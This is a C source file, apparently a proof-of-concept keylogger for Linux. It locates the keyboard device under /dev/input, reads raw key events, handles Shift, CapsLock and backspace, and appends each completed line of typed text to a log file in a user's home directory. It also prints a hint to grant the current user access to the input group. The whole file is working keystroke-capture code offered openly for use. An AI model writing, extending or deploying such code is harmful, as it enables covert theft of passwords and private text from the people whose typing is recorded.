// poc_keylogger_fixed.c → Perfect Shift + CapsLock + Backspace
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <dirent.h>
#include <ctype.h>

#define LOG_FILE "/home/chakradhar/poc_keylog.txt"

int shift_pressed = 0;
int caps_lock_on = 0;
char line[10000] = {0};
int len = 0;

const char *keymap[256] = {
    [KEY_A]="a",[KEY_B]="b",[KEY_C]="c",[KEY_D]="d",[KEY_E]="e",[KEY_F]="f",
    [KEY_G]="g",[KEY_H]="h",[KEY_I]="i",[KEY_J]="j",[KEY_K]="k",[KEY_L]="l",
    [KEY_M]="m",[KEY_N]="n",[KEY_O]="o",[KEY_P]="p",[KEY_Q]="q",[KEY_R]="r",
    [KEY_S]="s",[KEY_T]="t",[KEY_U]="u",[KEY_V]="v",[KEY_W]="w",[KEY_X]="x",
    [KEY_Y]="y",[KEY_Z]="z",
    [KEY_1]="1",[KEY_2]="2",[KEY_3]="3",[KEY_4]="4",[KEY_5]="5",
    [KEY_6]="6",[KEY_7]="7",[KEY_8]="8",[KEY_9]="9",[KEY_0]="0",
    [KEY_SPACE]=" ", [KEY_ENTER]="\n", [KEY_BACKSPACE]="\b", [KEY_TAB]="\t",
    [KEY_DOT]=".", [KEY_COMMA]=",", [KEY_SLASH]="/", [KEY_MINUS]="-",
    [KEY_APOSTROPHE]="'", [KEY_SEMICOLON]=";", [KEY_LEFTBRACE]="[",
    [KEY_RIGHTBRACE]="]", [KEY_GRAVE]="`", [KEY_EQUAL]="=", [KEY_BACKSLASH]="\\",
    // Special keys that produce no character
    [KEY_LEFTSHIFT]="",[KEY_RIGHTSHIFT]="",[KEY_CAPSLOCK]=""
};

int find_keyboard() {
    DIR *d = opendir("/dev/input");
    if (!d) return -1;
    struct dirent *dir;
    char path[64], name[256] = {0};
    int fd;
    while ((dir = readdir(d))) {
        if (!strstr(dir->d_name, "event")) continue;
        snprintf(path, sizeof(path), "/dev/input/%s", dir->d_name);
        fd = open(path, O_RDONLY);
        if (fd < 0) continue;
        ioctl(fd, EVIOCGNAME(sizeof(name)-1), name);
        if (strstr(name, "keyboard") || strstr(name, "Keyboard")) {
            closedir(d);
            return fd;
        }
        close(fd);
    }
    closedir(d);
    return -1;
}

int main() {
    int fd = find_keyboard();
    if (fd == -1) {
        printf("No keyboard found! Run: sudo usermod -aG input $USER && reboot\n");
        return 1;
    }

    remove(LOG_FILE);
    struct input_event ev;

    while (read(fd, &ev, sizeof(ev)) == sizeof(ev)) {
        if (ev.type != EV_KEY) continue;

        // Handle Shift press/release
        if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
            shift_pressed = (ev.value == 1 || ev.value == 2); // 1=press, 2=hold
            continue;
        }

        // Handle Caps Lock toggle
        if (ev.code == KEY_CAPSLOCK && ev.value == 1) {
            caps_lock_on = !caps_lock_on;
            continue;
        }

        // Only process normal key presses (not release or repeat)
        if (ev.value != 1) continue;

        // Backspace
        if (ev.code == KEY_BACKSPACE) {
            if (len > 0) len--;
            continue;
        }

        // Enter
        if (ev.code == KEY_ENTER) {
            line[len++] = '\n';
            FILE *f = fopen(LOG_FILE, "a");
            if (f) { fwrite(line, 1, len, f); fclose(f); }
            len = 0;
            continue;
        }

        // Get base character from keymap
        const char *base = keymap[ev.code];
        if (!base || base[0] == 0) continue;

        char c = base[0];

        // Apply Shift / CapsLock logic only to letters
        if (c >= 'a' && c <= 'z') {
            if (shift_pressed != caps_lock_on) {  // XOR → one of them active = uppercase
                c = toupper(c);
            }
        }
        // Optional: Add shifted symbols (!@#$%^&*() etc.) here later if you want

        if (len < sizeof(line)-2)
            line[len++] = c;
    }
    close(fd);
    return 0;
}
